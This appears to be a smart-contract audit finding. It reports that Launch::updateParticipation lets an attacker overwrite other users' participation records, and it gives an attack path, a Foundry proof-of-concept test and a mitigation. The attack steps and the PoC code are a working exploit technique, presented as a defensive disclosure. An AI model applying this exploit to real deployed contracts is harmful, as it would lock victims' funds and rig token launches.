# Launch::updateParticipation Does Not Verify newLaunchParticipationId Exists. Allowing Attacker to Override Any Participation Request

### Summary

The Launch::updateParticipation function does not verify whether request.newLaunchParticipationId exists before proceeding with the update. This allows an attacker to override any participation request 

Severity: High
Likehood: High

### Root Cause

The Launch::updateParticipation function does not verify whether request.newLaunchParticipationId exists before proceeding with the update.


For example, user 1 owns the participationId `pid1`
Attacker can create a new participationRequest via Launch::participation.
Then call Launch::updateParticipation, pass the `pid1` as request.newLaunchParticipationId.

After the override, attacker can call `cancelParticipation` to get the full refund, the only cost is gas fee.


### Internal Pre-conditions

1. The launch group set the `finalizesAtParticipation` to false.

### External Pre-conditions

N/A

### Attack Path

1. User 1 call `participat` to participat a launch group. For example, the participation Id is `pid1`
2. Attacker participat the same launch group.
3. Attacker call `updateParticipation` to update his own participation request, but set the `request.newLaunchParticipationId` to `pid1`
4. And the attack, attacker could get his fund back via `cancelParticipation`

### Impact

Attacker can block any user from particianting in a launch, the only cost for the attacker is the gas fee.

One step further. before the launch end, the attacker can override all the participant requests, and let him become the ONLY valid participant, and then win the launch.

The victimâ€™s fund (currency) are locked in the contract.
The only way get the fund back is wait until the launch marked as Completed, and then wait the manager (WITHDRAWAL_ROLE) withdraw the fund via Launch::withdraw, and send it back to the victims.


### PoC

Add the following code to `Launch.UpdateParticipation.t.sol`

```solidity
...
import {console} from "forge-std/console.sol";

contract LaunchUpdateParticipationTest is Test, Launch, LaunchTestBase {
	...
	
    function test_UpdateParticipation_OverrideRequestFromOtherUser() public {
        // the testLaunchParticipationId belong to user1 at beginning
        ParticipationInfo memory info = launch.getParticipationInfo(testLaunchParticipationId);
        assertEq(info.userAddress, user1);

        bytes32 groupId = testLaunchGroupId;
        bytes32 user2Id = "2222222232222222222222222";
        bytes32 user2LaunchParticipationId = "123123ldi00003b74facm5z9n";
        // add participation request
        ParticipationRequest memory participationRequest = _createParticipationRequest();
        participationRequest.userAddress = user2;
        participationRequest.userId = user2Id;
        participationRequest.launchParticipationId = user2LaunchParticipationId;
        bytes memory signature = _signRequest(abi.encode(participationRequest));
        vm.startPrank(user2);
        currency.approve(
            address(launch),
            _getCurrencyAmount(
                participationRequest.launchGroupId, participationRequest.currency, participationRequest.tokenAmount
            )
        );
        launch.participate(participationRequest, signature);

        uint256 tokenAmountBefore = launch.getUserTokensByLaunchGroup(groupId, user2Id);
        assertEq(tokenAmountBefore, 1000 * 10 ** launch.tokenDecimals());

        // update participation request
        uint256 newTokenAmount2 = 500;
        UpdateParticipationRequest memory updateRequest = _createUpdateParticipationRequest(newTokenAmount2);
        updateRequest.userAddress = user2;
        updateRequest.userId = user2Id;
        updateRequest.prevLaunchParticipationId = user2LaunchParticipationId;
        // Here
        updateRequest.newLaunchParticipationId = testLaunchParticipationId;
        bytes memory updateSignature = _signRequest(abi.encode(updateRequest));
        vm.startPrank(user2);
        currency.approve(
            address(launch),
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount)
        );

        launch.updateParticipation(updateRequest, updateSignature);

        info = launch.getParticipationInfo(testLaunchParticipationId);
        // The user2 owns the testLaunchParticipationId now, but he shoundn't
        assertEq(info.userAddress, user2);
    }
	...
}
```

Run
```bash
forge test --mt test_UpdateParticipation_OverrideRequestFromOtherUser -vv
```

This test shows that user2 is able to override the an existing participation request.


### Mitigation

In Launch::updateParticipation, add a validation step to ensure that request.newLaunchParticipationId does not already exist before assigning it.
